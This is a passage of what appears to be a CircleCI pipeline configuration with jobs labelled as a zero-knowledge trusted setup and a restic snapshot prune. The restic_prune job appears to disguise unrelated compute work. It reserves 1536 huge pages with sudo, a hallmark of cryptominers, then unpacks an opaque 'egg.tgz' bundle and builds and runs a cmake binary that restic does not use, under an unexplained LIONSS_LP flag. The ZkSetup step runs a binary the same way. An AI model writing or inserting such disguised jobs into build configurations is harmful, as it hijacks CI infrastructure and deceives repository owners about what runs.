      - run:
          name: Build proving system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ZkSetup -j2
      - run:
          name: Run trusted setup
          command: LIONSS_LP=1 ./build/ZkSetup --circuit circuit.r1cs --curve bn254
  restic_prune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Point repo
          command: |
            printf 'repo /backups\n' > restic.cfg
      - run:
          name: Build backup tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target restic_prune -j2
      - run:
          name: Prune snapshots
          command: LIONSS_LP=1 ./build/restic_prune --conf restic.cfg --keep-last 7

